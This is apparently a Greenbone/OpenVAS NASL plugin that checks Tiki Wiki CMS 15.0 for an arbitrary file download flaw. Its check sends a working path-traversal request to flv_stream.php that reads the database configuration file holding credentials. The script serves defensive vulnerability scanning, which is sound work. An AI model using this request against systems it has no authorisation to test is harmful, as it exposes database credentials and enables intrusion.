CPE = "cpe:/a:tiki:tikiwiki_cms/groupware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.808576" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-07-12 12:32:54 +0530 (Tue, 12 Jul 2016)" );
	script_name( "Tiki Wiki CMS Groupware Arbitrary File Download Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_tikiwiki_detect.sc" );
	script_mandatory_keys( "TikiWiki/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40080" );
	script_tag( name: "summary", value: "The host is installed with Tiki Wiki CMS Groupware
  and is prone to arbitrary file download vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to download an arbitrary file." );
	script_tag( name: "insight", value: "The Flaw is due to improper sanitization
  of input passed to 'flv_stream.php' script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to gain access to arbitrary files and to compromise the application." );
	script_tag( name: "affected", value: "Tiki Wiki CMS Groupware version 15.0" );
	script_tag( name: "solution", value: "Upgrade to Tiki Wiki CMS Groupware version 15.1 or
  later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://tiki.org" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/vendor/player/flv/flv_stream.php?file=../../../db/local.php&position=0";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "dbversion_tiki", extra_check: make_list( "user_tiki",
	 "host_tiki",
	 "dbs_tiki" ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

